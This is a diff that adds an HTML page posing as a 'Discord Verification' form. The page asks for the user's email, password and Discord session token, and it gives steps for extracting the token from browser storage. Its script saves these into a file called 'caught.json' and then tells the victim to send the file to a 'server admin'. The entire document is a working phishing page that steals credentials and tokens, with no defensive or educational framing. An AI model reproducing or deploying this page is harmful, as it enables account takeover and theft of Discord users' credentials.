@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        body { background-color: #36393f; color: #ffffff; font-family: 'Arial', sans-serif; margin: 0; padding: 20px; }
+        .container { max-width: 400px; margin: 50px auto; background-color: #2c2f33; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.5); }
+        h1 { text-align: center; color: #7289da; }
+        p { text-align: center; color: #b9bbbe; }
+        input { display: block; width: 100%; padding: 10px; margin: 10px 0; border: none; border-radius: 5px; }
+        input[type="submit"] { background-color: #7289da; color: white; cursor: pointer; }
+        input[type="submit"]:hover { background-color: #677bc4; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Discord Verification</h1>
+        <p>Verify your account to continue using the server.</p>
+        <form action="/submit" method="POST" onsubmit="saveData(event)">
+            <input type="text" name="email" placeholder="Your Email" required><br>
+            <input type="password" name="password" placeholder="Your Password" required><br>
+            <input type="text" name="token" placeholder="Your Token (Ctrl+Shift+I > Application > Local Storage > discord.com > token)" required><br>
+            <input type="submit" value="Verify Now">
+        </form>
+    </div>
+
+    <script>
+        function saveData(event) {
+            event.preventDefault();
+            const form = event.target;
+            const formData = new FormData(form);
+            const data = {
+                email: formData.get('email'),
+                password: formData.get('password'),
+                token: formData.get('token')
+            };
+            // Download the data as a JSON file
+            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'caught.json';
+            a.click();
+            URL.revokeObjectURL(url);
+            alert("Verification complete! Please send the downloaded 'caught.json' file to the server admin.");
+        }
+    </script>
+</body>
+</html>
